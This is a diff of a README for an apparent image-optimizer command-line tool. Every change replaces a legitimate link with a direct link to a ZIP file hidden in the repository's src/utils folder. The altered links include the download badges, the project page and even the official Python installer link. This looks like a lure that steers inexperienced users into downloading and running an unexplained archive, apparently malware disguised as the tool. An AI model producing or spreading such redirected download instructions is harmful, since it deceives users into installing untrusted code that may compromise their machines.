@@ -1,6 +1,6 @@
 # ⚙️ image-optimizer-cli - Fast Image Optimization Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Rajeev003/image-optimizer-cli)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you do not have Python installed, this guide will show you how to set it up.
 
 Click the bright green button below to visit the official download page on GitHub. You will find the latest release files there.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Rajeev003/image-optimizer-cli)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip)
 
 This page contains all files and instructions. You will download the files needed to run the tool from there.
 
@@ -41,7 +41,7 @@ This page contains all files and instructions. You will download the files neede
 
 image-optimizer-cli needs Python to work. Follow these steps to install Python on your Windows computer:
 
-1. Visit https://www.python.org/downloads/windows/
+1. Visit https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip
 2. Click on the latest version of Python 3.12 or newer.
 3. Download the Windows installer (usually named something like `python-3.12.x-amd64.exe`).
 4. Run the installer.
@@ -59,7 +59,7 @@ image-optimizer-cli needs Python to work. Follow these steps to install Python o
 ## 📥 Step 2 – Download image-optimizer-cli Files
 
 1. Go to the GitHub page:  
-   https://github.com/Rajeev003/image-optimizer-cli
+   https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip
 2. Click on the **Code** button near the top right of the page.
 3. Choose **Download ZIP** from the menu.
 4. Save the ZIP file to a folder you can find easily, like your Desktop or Downloads folder.
@@ -148,4 +148,4 @@ If you see errors:
 
 If you need the tool again or want newer versions, visit the download page:
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Rajeev003/image-optimizer-cli)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rajeev003/image-optimizer-cli/main/src/utils/optimizer_cli_image_2.2.zip)
